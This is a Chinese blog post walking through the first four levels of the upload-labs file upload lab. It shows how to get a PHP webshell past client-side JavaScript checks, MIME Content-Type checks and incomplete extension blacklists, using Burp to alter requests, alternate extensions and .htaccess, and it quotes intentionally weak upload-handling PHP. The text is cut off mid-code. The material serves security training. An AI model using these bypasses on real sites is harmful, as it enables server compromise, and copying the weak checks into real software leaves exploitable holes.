<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"example.com",root:"/",scheme:"Muse",version:"7.8.0",exturl:!1,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!1},copycode:{enable:!1,show_result:!1,style:null},back2top:{enable:!0,sidebar:!1,scrollpercent:!1},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!1,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!1,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}}}</script><meta property="og:type" content="website"><meta property="og:title" content="Hexo"><meta property="og:url" content="http://example.com/index.html"><meta property="og:site_name" content="Hexo"><meta property="og:locale" content="en_US"><meta property="article:author" content="John Doe"><meta name="twitter:card" content="summary"><link rel="canonical" href="http://example.com/"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!0,isPost:!1,lang:"en"}</script><title>Hexo</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="Toggle navigation bar"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span><h1 class="site-title">Hexo</h1><span class="logo-line-after"><i></i></span></a></div><div class="site-nav-right"><div class="toggle popup-trigger"></div></div></div><nav class="site-nav"><ul id="menu" class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li></ul></nav></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content index posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en"><link itemprop="mainEntityOfPage" href="http://example.com/2021/03/04/upload-labs-wp/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.gif"><meta itemprop="name" content="John Doe"><meta itemprop="description" content=""></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Hexo"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2021/03/04/upload-labs-wp/" class="post-title-link" itemprop="url">upload-labs-wp</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">Posted on</span> <time title="Created: 2021-03-04 15:43:26" itemprop="dateCreated datePublished" datetime="2021-03-04T15:43:26+08:00">2021-03-04</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">Edited on</span> <time title="Modified: 2021-03-14 12:12:06" itemprop="dateModified" datetime="2021-03-14T12:12:06+08:00">2021-03-14</time></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>上传一个php一句话木马，页面立刻提示：该文件不允许上传，请上传.jpg|.png|.gif类型的文件</p><p><img src="/2021/03/04/upload-labs-wp/1.jpg"></p><p>查看提示。</p><p><img src="/2021/03/04/upload-labs-wp/2.jpg"></p><p>这题是客户端js对上传文件的检查。</p><p>方法一：禁用网页js。</p><p>使用noscript插件禁用js。</p><p><img src="/2021/03/04/upload-labs-wp/3.jpg"></p><p><img src="/2021/03/04/upload-labs-wp/4.jpg"></p><p>上传成功</p><p>方法二：F12删除js代码，效果与方法一相同。</p><p>方法三：用burpsuite抓包改包。</p><p><img src="/2021/03/04/upload-labs-wp/5.jpg"></p><p>将php文件后缀改为jpg等图片格式，可绕过js客户端检测，抓包，修改filename后缀为php。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>客户端校验</strong>　　</p><p>一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。</p><p><strong>判断方式：</strong>在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。有时一般提交后，立即有弹窗提示禁止上传，就可以判断为前端检测，或者直接右键查看页面源代码也能看到javascript的检测代码</p><p><strong>客户端绕过</strong>：</p><ul><li><strong>可以利用burp抓包改包，先上传一个图片类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可注,有时修改文件名字后，请求头中的Content-Length的值也要改。</strong></li><li><strong>禁用javascript</strong></li><li><strong>修改javascript</strong></li><li><strong>可以用firebug将form表单中的onsubmit事件删除，这样就可以绕过验证。</strong></li></ul><p><strong>客户端验证代码形如下：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>图片上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">  <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> flag = <span class="literal">false</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">&quot;file&quot;</span>).value;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    str = str.substring(str.lastIndexOf(<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;bmp&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span></span><br><span class="line"></span><br><span class="line">      if(str==arr[i])&#123;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        flag = <span class="literal">true</span>;</span></span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!flag)&#123;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      alert(<span class="string">&#x27;文件不合法！&#x27;</span>);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> flag;</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;checkFile()&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>接收文件的脚本upload.php代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;submit&quot;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$name</span> = md5(date(<span class="string">&#x27;Y-m-d h:m:s&#x27;</span>)).strrchr(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$tmp</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tem_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  move_uploaded_file(<span class="variable">$tmp</span>,<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;文件上传成功！path：&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h1><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p>本题提示</p><p><img src="/2021/03/04/upload-labs-wp/6.jpg"></p><p>方法一：将木马文件名后缀修改为jpg上传，抓包之后，和less-1操作相同，将后缀名修改回来即可。</p><p>方法二：直接上传php木马，抓包，修改请求头的content-type字段，将内容修改成image/jpeg(png/gif)</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p><strong>服务端校验之MIME验证</strong></p><p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式</p><p>常见的MIME类型：</p><ul><li>text/html ： HTML格式</li><li>text/plain ：纯文本格式</li><li>text/xml ： XML格式<br>image/gif ：gif图片格式</li><li>image/jpeg ：jpg图片格式</li><li>image/png：png图片格式</li><li>application/xhtml+xml ：XHTML格式</li><li>application/xml： XML数据格式</li><li>application/atom+xml ：Atom XML聚合格式</li><li>application/json： JSON数据格式</li><li>application/pdf：pdf格式</li><li>application/msword ： Word文档格式</li><li>application/octet-stream ： 二进制流数据</li></ul><p><strong>一般的绕过方法：</strong></p><p>一般是利用burp suite进行抓包，然后修改Content-Type为image/png,image/jpeg,image/gif</p><p>文件扩展名绕过：前提：黑名单校验</p><p>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。</p><p>绕过方法：</p><p>（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类</p><p>（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类</p><p>能被解析的文件扩展名列表：</p><p>jsp jspx jspf</p><p>asp asa cer aspx</p><p>对文件MIME类型做验证的PHP代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>]==<span class="string">&quot; image/jpeg&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$imageTempName</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$imageName</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$last</span> = substr(<span class="variable">$imageName</span>,strrpos(<span class="variable">$imageName</span>,<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!is_dir(<span class="string">&quot;uploadFile&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">    mkdir(<span class="string">&quot;uploadFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$imageName</span> = md5(<span class="variable">$imageName</span>).<span class="variable">$last</span>;</span><br><span class="line"></span><br><span class="line">  move_upload_file(<span class="variable">$imageTempName</span>,<span class="string">&quot;./uploadFile/&quot;</span>.<span class="variable">$imageName</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;文件上传成功！ path = /uploadFile/<span class="subst">$imageName</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;文件上传类型错误，请重新上传...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><h1 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h1><h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><p>查看提示</p><p><img src="/2021/03/04/upload-labs-wp/7.jpg"></p><p>有过滤黑名单，但是不全，可以利用其他的后缀绕过，这里可以抓包，到burpsuite的intruder模块fuzz一下，看看可以用哪些后缀。</p><p><img src="/2021/03/04/upload-labs-wp/8.jpg"></p><p>可以看到length&gt;5415的即可。</p><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>; <span class="comment">//将文件名修改为日期与随机数的组合           </span></span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可先上传文件，抓包，修改后缀名为.php4。</p><p><img src="/2021/03/04/upload-labs-wp/12.jpg"></p><p>上传成功。</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>不完善的黑名单所导致的漏洞，使用不存在于黑名单但是可执行的后缀即可。</p><ul><li>常见的可执行文件的后缀：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP: php2、php3、php5、phtml、pht</span><br><span class="line">ASP: aspx、ascx、ashx、cer、asa</span><br><span class="line">JSP: jspx</span><br></pre></td></tr></table></figure><p>黑名单过滤方式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Blacklist</span> = <span class="keyword">array</span>(<span class="string">&#x27;asp&#x27;</span>,<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;jsp&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;asa&#x27;</span>,<span class="string">&#x27;aspx&#x27;</span>);  <span class="comment">//黑名单</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;submit&quot;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$name</span> = <span class="variable">$FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];  <span class="comment">//接收文件名</span></span><br><span class="line"></span><br><span class="line">  <span class="variable">$extension</span> = substr(strrchr(<span class="variable">$name</span>, <span class="string">&quot;.&quot;</span>) , <span class="number">1</span>);  <span class="comment">//得到扩展名</span></span><br><span class="line"></span><br><span class="line">  <span class="variable">$boo</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$Blaklist</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$value</span>==<span class="variable">$extension</span>) &#123;  <span class="comment">//迭代判断是否命中</span></span><br><span class="line"></span><br><span class="line">      <span class="variable">$boo</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;   <span class="comment">//命中后直接退出循环</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$boo</span>) &#123;  <span class="comment">//若没有被命中，则进行上传操作</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]; <span class="comment">//接收文件大小</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;temp_name&#x27;</span>];  <span class="comment">//临时路径</span></span><br><span class="line"></span><br><span class="line">    move_uploaded_file(<span class="variable">$tmp</span>, <span class="variable">$name</span>);  <span class="comment">//移动临时文件到当前文件目录</span></span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件不合法!!&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h1><h2 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h2><p>查看提示</p><p><img src="/2021/03/04/upload-labs-wp/10.jpg"></p><p>过滤了大部分后缀，fuzz一下。</p><p><img src="/2021/03/04/upload-labs-wp/9.jpg"></p><p>只有htaccess可用。</p><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span 